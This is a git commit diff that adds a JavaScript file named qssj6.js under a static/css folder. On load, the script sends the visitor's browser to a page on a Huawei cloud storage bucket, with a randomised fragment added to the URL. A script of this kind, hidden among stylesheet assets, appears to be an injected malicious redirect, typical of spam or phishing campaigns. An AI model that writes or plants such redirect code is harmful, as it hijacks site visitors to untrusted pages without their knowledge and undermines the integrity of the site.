61467a60efc98ca108d2ac21e910707804a25029
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-25 16:09:22 +0800

    Create qssj6.js

---
+++ static/css/qssj6.js
@@ -0,0 +1,15 @@
+var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/61ea714ef2ae4cc5a6b397b52589e7e6.html#{nnnnnnn}{wwww}',];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
